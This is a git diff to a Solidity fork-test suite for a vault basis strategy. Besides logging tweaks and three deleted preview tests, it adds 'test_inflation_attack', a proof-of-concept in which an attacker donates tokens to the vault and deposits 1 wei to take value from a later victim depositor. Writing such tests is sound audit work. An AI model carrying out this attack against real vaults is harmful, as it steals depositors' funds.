@@ -239,9 +239,11 @@ abstract contract BasisStrategyBaseTest is PositionMngerForkTest {
         vm.startPrank(from);
         IERC20(asset).approve(address(vault), assets);
         StrategyState memory state0 = helper.getStrategyState();
-        vault.deposit(assets, from);
+        uint256 shares = vault.deposit(assets, from);
         StrategyState memory state1 = helper.getStrategyState();
         _validateStateTransition(state0, state1);
+        console.log("Deposited assets: ", assets);
+        console.log("Received shares: ", shares);
     }
 
     function _mint(address from, uint256 shares) internal {
@@ -334,13 +336,6 @@ abstract contract BasisStrategyBaseTest is PositionMngerForkTest {
     /*//////////////////////////////////////////////////////////////
                         DEPOSIT/MINT TEST
     //////////////////////////////////////////////////////////////*/
-
-    function test_previewDepositMint_first() public view {
-        uint256 shares = vault.previewDeposit(TEN_THOUSANDS_USDC);
-        assertEq(shares, TEN_THOUSANDS_USDC);
-        uint256 assets = vault.previewMint(shares);
-        assertEq(assets, TEN_THOUSANDS_USDC);
-    }
 
     function test_deposit_first() public validateFinalState {
         uint256 shares = vault.previewDeposit(TEN_THOUSANDS_USDC);
@@ -492,13 +487,6 @@ abstract contract BasisStrategyBaseTest is PositionMngerForkTest {
                         REDEEM/WITHDRAW TEST
     //////////////////////////////////////////////////////////////*/
 
-    function test_previewWithdrawRedeem_whenIdleEnough() public afterDeposited {
-        uint256 totalShares = vault.balanceOf(user1);
-        uint256 assets = vault.previewRedeem(totalShares / 2);
-        uint256 shares = vault.previewWithdraw(assets);
-        assertEq(shares, totalShares / 2);
-    }
-
     function test_withdraw_whenIdleEnough() public afterDeposited validateFinalState {
         uint256 user1BalanceBefore = IERC20(asset).balanceOf(user1);
         uint256 totalShares = vault.balanceOf(user1);
@@ -509,14 +497,6 @@ abstract contract BasisStrategyBaseTest is PositionMngerForkTest {
         uint256 sharesAfter = vault.balanceOf(user1);
         assertEq(user1BalanceAfter, user1BalanceBefore + assets);
         assertEq(sharesAfter, totalShares - shares);
-    }
-
-    function test_previewWithdrawRedeem_whenIdleNotEnough() public afterPartialUtilized validateFinalState {
-        uint256 totalShares = vault.balanceOf(user1);
-        uint256 redeemShares = totalShares * 2 / 3;
-        uint256 assets = vault.previewRedeem(redeemShares);
-        uint256 shares = vault.previewWithdraw(assets);
-        assertEq(shares, redeemShares);
     }
 
     function test_maxWithdraw() public afterPartialUtilized validateFinalState {
@@ -1251,5 +1231,56 @@ abstract contract BasisStrategyBaseTest is PositionMngerForkTest {
         assertEq(state.pendingDeutilization, 0, "pendingDeutilization");
         assertNotEq(state.positionNetBalance, 0, "positionNetBalance");
         assertEq(state.upkeepNeeded, false, "upkeepNeeded");
+    }
+
+    function test_inflation_attack() public {
+        uint256 balBefore = IERC20(asset).balanceOf(user1);
+        console.log("user1 original deposit");
+        _deposit(user1, TEN_THOUSANDS_USDC);
+        (uint256 pendingUtilizationInAsset,) = strategy.pendingUtilizations();
+        _utilize(pendingUtilizationInAsset);
+
+        vm.startPrank(user1);
+        vault.requestRedeem(vault.balanceOf(user1), user1, user1);
+        vm.stopPrank();
+        (, uint256 pendingDeutilization) = strategy.pendingUtilizations();
+        _deutilize(pendingDeutilization);
+        console.log("vault.idleAssets()", vault.idleAssets());
+        bytes32 user1RequestKey = vault.getWithdrawKey(user1, 0);
+        // LogarithmVault.WithdrawRequest memory req = vault.withdrawRequests(user1RequestKey);
+        vm.startPrank(user1);
+        IERC20(asset).transfer(address(vault), TEN_THOUSANDS_USDC);
+        vm.stopPrank();
+        console.log("user1 deposit after withdrawRequest.");
+        _deposit(user1, 1);
+        console.log("victim first deposit");
+        _deposit(user2, TEN_THOUSANDS_USDC / 10_000);
+        vm.startPrank(user1);
+        vault.requestRedeem(vault.balanceOf(user1), user1, user1);
+        vm.stopPrank();
+        vm.startPrank(user1);
+        vault.claim(user1RequestKey);
+        uint256 balAfter = IERC20(asset).balanceOf(user1);
+        console.log("balanceBefore", balBefore);
+        console.log("balanceAfter", balAfter);
+        // console.log("profit", balAfter - balBefore);
+
+        vm.startPrank(user2);
+        vault.requestRedeem(vault.balanceOf(user2), user2, user2);
+        vm.stopPrank();
+        console.log("victim balance", IERC20(asset).balanceOf(user2));
+    }
+
+    function test_idleAssetsShouldBeZero_whenSupplyZero() public {
+        _deposit(user1, TEN_THOUSANDS_USDC);
+        (uint256 pendingUtilizationInAsset,) = strategy.pendingUtilizations();
+        _utilize(pendingUtilizationInAsset);
+
+        vm.startPrank(user1);
+        vault.requestRedeem(vault.balanceOf(user1), user1, user1);
+        vm.stopPrank();
+        (, uint256 pendingDeutilization) = strategy.pendingUtilizations();
+        _deutilize(pendingDeutilization);
+        console.log("vault.idleAssets()", vault.idleAssets());
     }
 }
